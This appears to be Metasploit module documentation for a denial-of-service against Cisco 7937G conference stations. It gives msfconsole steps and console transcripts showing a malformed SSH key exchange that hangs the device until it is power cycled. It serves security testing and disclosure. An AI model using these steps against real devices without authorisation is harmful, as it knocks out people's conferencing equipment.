## Vulnerable Application

  [Cisco 7937G](https://www.cisco.com/c/en/us/support/collaboration-endpoints/unified-ip-conference-station-7937g/model.html) Conference Station.
  This module has been tested successfully against firmware versions SCCP-1-4-5-5 and SCCP-1-4-5-7.

### Description

  This module exploits a bug in how the conference station handles incoming SSH
  connections that provide an incompatible key exchange. By connecting with an
  incompatible key exchange, the device becomes nonresponsive until it is manually power cycled.

## Verification Steps

  1. Obtain a Cisco 7937G Conference Station.
  2. Enable SSH Access on the device.
  3. Start msfconsole
  4. Do: `use auxiliary/dos/cisco/cisco_7937G_dos`
  5. Do: `set RHOST 192.168.1.10`
  6. Do: `run`
  7. The conference station should now be nonresponsive until it is power cycled

## Options

  No options

## Scenarios

### Cisco 7937G Running Firmware Version SCCP-1-4-5-7

#### Successful Scenario:
```
msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run

[*] Starting server...
[*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
[-] 192.168.110.209 - Exception: Incompatible ssh peer (no acceptable kex algorithm)
[-] 192.168.110.209 - Traceback (most recent call last):
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2083, in run
[-] 192.168.110.209 -     self._handler_table[ptype](self, m)
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2198, in _negotiate_keys
[-] 192.168.110.209 -     self._parse_kex_init(m)
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2354, in _parse_kex_init
[-] 192.168.110.209 -     raise SSHException(
[-] 192.168.110.209 - paramiko.ssh_exception.SSHException: Incompatible ssh peer (no acceptable kex algorithm)
[-] 192.168.110.209 - 
[*] 192.168.110.209 - dos non-reset attack completed!
[*] 192.168.110.209 - Errors are intended.
[*] 192.168.110.209 - Device must be power cycled to restore functionality.
[*] Auxiliary module execution completed
```

#### Unsuccessful Scenario:
```
msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run

[*] Starting server...
[-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
[*] Auxiliary module execution completed
```

### Cisco 7937G Running Firmware Version SCCP-1-4-5-5

#### Successful Scenario:
```
msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run

[*] Starting server...
[*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
[-] 192.168.110.209 - Exception: Incompatible ssh peer (no acceptable kex algorithm)
[-] 192.168.110.209 - Traceback (most recent call last):
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2083, in run
[-] 192.168.110.209 -     self._handler_table[ptype](self, m)
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2198, in _negotiate_keys
[-] 192.168.110.209 -     self._parse_kex_init(m)
[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2354, in _parse_kex_init
[-] 192.168.110.209 -     raise SSHException(
[-] 192.168.110.209 - paramiko.ssh_exception.SSHException: Incompatible ssh peer (no acceptable kex algorithm)
[-] 192.168.110.209 - 
[*] 192.168.110.209 - dos non-reset attack completed!
[*] 192.168.110.209 - Errors are intended.
[*] 192.168.110.209 - Device must be power cycled to restore functionality.
[*] Auxiliary module execution completed
```

#### Unsuccessful Scenario:
```
msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run

[*] Starting server...
[-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
[*] Auxiliary module execution completed
```
